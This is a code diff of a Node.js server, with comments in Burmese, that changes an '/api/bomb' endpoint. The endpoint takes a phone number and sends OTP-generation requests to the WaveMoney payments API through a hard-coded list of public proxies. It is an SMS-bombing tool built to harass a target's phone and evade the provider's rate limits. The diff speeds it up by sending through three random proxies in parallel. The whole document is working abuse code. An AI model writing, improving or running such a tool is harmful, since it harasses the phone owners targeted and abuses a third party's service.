@@ -10,7 +10,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 100 PROXIES
+// 100 PROXIES (အရင်အတိုင်း)
 const proxies = [
     "http://80.74.54.148:3128", "http://142.93.202.130:3128", "http://34.43.46.91:443",
     "http://103.178.160.149:3128", "http://103.158.210.21:8090", "http://165.154.162.73:8888",
@@ -60,19 +60,19 @@ const proxies = [
     "socks4://41.75.84.86:4153", "socks4://167.99.3.26:8447", "socks4://174.64.199.79:4145"
 ];
 
-let proxyIndex = 0;
-
 app.get('/api/bomb', async (req, res) => {
     const phone = req.query.phone;
     if (!phone) return res.status(400).json({ error: 'Phone number required' });
 
-    const maxRetries = 3; // ၃ ခုပဲ စမ်းမယ် (မြန်အောင်)
-    let attempts = 0;
-    let isSuccess = false;
+    // ကျပန်း Proxy ၃ ခုကို ရွေးပြီး တစ်ပြိုင်နက်တည်း ပို့မယ်
+    // တစ်ခုခု အောင်မြင်ရင် ချက်ချင်း ပြန်ပေးမယ် (အရမ်းမြန်တယ်)
+    const shuffled = [...proxies].sort(() => 0.5 - Math.random());
+    const selectedProxies = shuffled.slice(0, 3);
+    
+    let completed = false;
 
-    while (attempts < maxRetries && !isSuccess) {
-        const proxyUrl = proxies[proxyIndex % proxies.length];
-        proxyIndex++;
+    const attempts = selectedProxies.map(async (proxyUrl) => {
+        if (completed) return;
 
         let agent;
         try {
@@ -82,8 +82,7 @@ app.get('/api/bomb', async (req, res) => {
                 agent = new HttpsProxyAgent(proxyUrl);
             }
         } catch (e) {
-            attempts++;
-            continue;
+            return;
         }
 
         const targetUrl = `https://api.wavemoney.io:8100/v3/wmt-mfs-otp/generate-otp?msisdn=${phone}`;
@@ -96,22 +95,32 @@ app.get('/api/bomb', async (req, res) => {
                     "User-Agent": "okhttp/4.9.3",
                     "Accept-Language": "my"
                 },
-                timeout: 3000, // ၃ စက္ကန့်ပဲ စောင့်မယ် (အရင်က ၇ စက္ကန့်)
+                timeout: 3000, 
                 validateStatus: () => true 
             });
 
-            if (response.status === 200 || response.status === 500) {
-                isSuccess = true;
-                return res.json({ status: 'success', proxy_used: proxyIndex });
+            if (!completed && (response.status === 200 || response.status === 500)) {
+                completed = true;
+                return res.json({ status: 'success', proxy: proxyUrl });
             }
         } catch (error) {
-            // Proxy ကျရင် ဆက်သွားမယ်
+            // Error တက်ရင် ကျော်မယ်
         }
-        
-        attempts++;
+    });
+
+    // Promise.race သုံးပြီး ပထမဆုံး အောင်မြင်တဲ့အဖြေကို ယူမယ်
+    const result = await Promise.race([
+        Promise.all(attempts),
+        new Promise((resolve) => setTimeout(() => resolve({ status: 'timeout' }), 3500))
+    ]);
+
+    if (result && result.status === 'success') {
+        return; // response ပို့ပြီးသား
     }
 
-    return res.status(502).json({ status: 'all_proxies_failed' });
+    if (!res.headersSent) {
+        return res.status(502).json({ status: 'failed' });
+    }
 });
 
 app.get('/', (req, res) => {
